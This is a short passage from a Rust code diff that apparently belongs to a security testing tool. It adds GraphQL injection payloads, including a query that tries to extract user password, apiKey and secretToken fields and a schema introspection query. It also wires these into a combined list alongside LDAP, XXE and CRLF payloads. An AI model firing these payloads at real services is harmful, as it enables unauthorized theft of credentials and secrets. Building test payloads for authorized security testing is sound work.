+        r#"{"query":"query{user(id:1){...AdminFields}}fragment AdminFields on User{password apiKey secretToken}"}"#.to_string(),
+        r#"{"query":"query{...on Query{__schema{types{name}}}}"}"#.to_string(),
+    ]);
+
+    payloads
+}
+
 /// Get ALL advanced payloads combined
 pub fn get_all_advanced_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
@@ -2171,6 +2789,7 @@ pub fn get_all_advanced_payloads() -> Vec<String> {
     all_payloads.extend(generate_ldap_payloads());
     all_payloads.extend(generate_xxe_payloads());
     all_payloads.extend(generate_crlf_payloads());
+    all_payloads.extend(generate_graphql_injection_payloads()); // 30+
 
     all_payloads
 }
